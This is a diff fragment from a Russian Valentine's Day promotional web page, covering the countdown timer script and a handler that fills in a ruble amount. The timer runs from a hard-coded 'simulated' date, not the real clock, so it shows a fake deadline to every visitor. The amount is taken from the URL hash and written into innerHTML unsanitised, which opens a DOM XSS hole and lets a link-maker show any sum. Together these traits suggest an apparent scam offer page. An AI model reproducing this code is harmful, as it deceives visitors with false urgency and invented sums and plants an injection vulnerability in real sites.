+            // Акция до 16 февраля 23:59:59 текущего года
+            const endDate = new Date(currentYear, 1, 16, 23, 59, 59); // 16 февраля (месяц 1 = февраль)
+            
+            // Проверка: акция начинается 7 февраля
+            const startDate = new Date(currentYear, 1, 7, 0, 0, 0);
+            if (simulatedNow < startDate) {
+                // Акция ещё не началась
+                const timer = document.getElementById('countdownTimer');
+                const expired = document.getElementById('timerExpired');
+                if (timer) timer.style.display = 'none';
+                if (expired) {
+                    expired.textContent = 'Акция начнётся 7 февраля';
+                    expired.style.display = 'block';
+                }
+                return;
+            }
+            
+            // Базовая симулированная дата (8 февраля 12:00:00)
+            const simulatedBase = new Date(currentYear, 1, 8, 12, 0, 0);
+            const pageLoadTime = Date.now();
+            
+            function updateTimer() {
+                // Симулируем время: базовая дата + время с момента загрузки страницы
+                const elapsed = Date.now() - pageLoadTime;
+                const simulatedNow = new Date(simulatedBase.getTime() + elapsed);
+                
+                const diff = endDate - simulatedNow;
+                
+                if (diff <= 0) {
+                    // Акция завершена
+                    const timer = document.getElementById('countdownTimer');
+                    const expired = document.getElementById('timerExpired');
+                    if (timer) timer.style.display = 'none';
+                    if (expired) expired.style.display = 'block';
+                    return;
+                }
+                
+                const days = Math.floor(diff / (1000 * 60 * 60 * 24));
+                const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+                
+                // Обновляем цифры с анимацией
+                updateTimerDigit('days1', days, true);
+                updateTimerDigit('days2', days, false);
+                updateTimerDigit('hours1', hours, true);
+                updateTimerDigit('hours2', hours, false);
+                updateTimerDigit('minutes1', minutes, true);
+                updateTimerDigit('minutes2', minutes, false);
+                updateTimerDigit('seconds1', seconds, true);
+                updateTimerDigit('seconds2', seconds, false);
+            }
+            
+            // Обновляем сразу и затем каждую секунду
+            updateTimer();
+            setInterval(updateTimer, 1000);
+        }
+        
+        document.addEventListener('DOMContentLoaded', function () {
+            const elems = document.querySelectorAll('#tr_summ');
+            let summ = document.location.hash.replace('#', '');
+            
+            if (summ && summ.length) {
+                elems.forEach(el => {
+                    el.textContent = summ + ' ₽';
+                });
+                
+                // Update main amount display
+                const offerValue = document.querySelector('.offer-value');
+                if (offerValue) {
+                    const cleanSum = summ.replace(/\s/g, '').replace('₽', '');
+                    offerValue.innerHTML = cleanSum + '<span> ₽</span>';
+                }
+            }
+            
+            // Запускаем таймер
+            startCountdown();
+            
+            console.log('💝 С Днём Святого Валентина!');
+        });
+    </script>
+</body>
+</html>
